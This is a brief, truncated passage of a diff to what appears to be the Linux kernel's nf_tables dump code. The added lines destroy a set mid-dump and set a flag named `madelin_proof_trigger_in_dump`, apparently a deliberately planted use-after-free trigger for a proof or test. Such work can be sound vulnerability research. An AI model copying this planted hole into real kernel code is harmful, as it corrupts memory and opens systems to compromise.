 	struct nlattr *nest;
 	u32 portid, seq;
 	int event;
+
+	if (dump_ctx->set) {
+		madelin_proof_trigger_in_dump = true;
+		nf_tables_destroy_set(&dump_ctx->ctx, (struct nft_set *)dump_ctx->set);
